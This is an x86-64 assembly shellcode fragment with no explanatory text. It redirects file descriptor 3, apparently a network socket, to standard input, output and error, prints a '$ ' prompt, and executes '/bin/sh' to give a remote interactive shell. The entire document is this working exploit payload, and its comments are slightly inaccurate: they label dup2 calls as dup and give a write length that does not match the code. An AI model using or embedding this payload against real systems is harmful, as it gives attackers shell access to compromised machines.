xor esi,esi
push 0x21
pop rax
syscall                        // dup(3, 0)
push 0x1
pop rsi
push 0x21
pop rax
syscall                        // dup(3, 1)
push 0x2
pop rsi
push 0x21
pop rax
syscall                        // dup(3, 2)
xor esi, esi
mov rdx, 0x6
movabs rcx, 0x2024
push rsi
push rcx
push rsp
pop rsi
mov rdi, 0x1
mov eax, 0x1
syscall                        // write(1, "$ ", 2)
xor esi, esi
movabs rbx, 0x68732f2f6e69622f
push rsi
push rbx
push rsp
pop  rdi
push 0x3b
pop rax
xor edx, edx
syscall                        // execve("/bin/sh", NULL, 0)
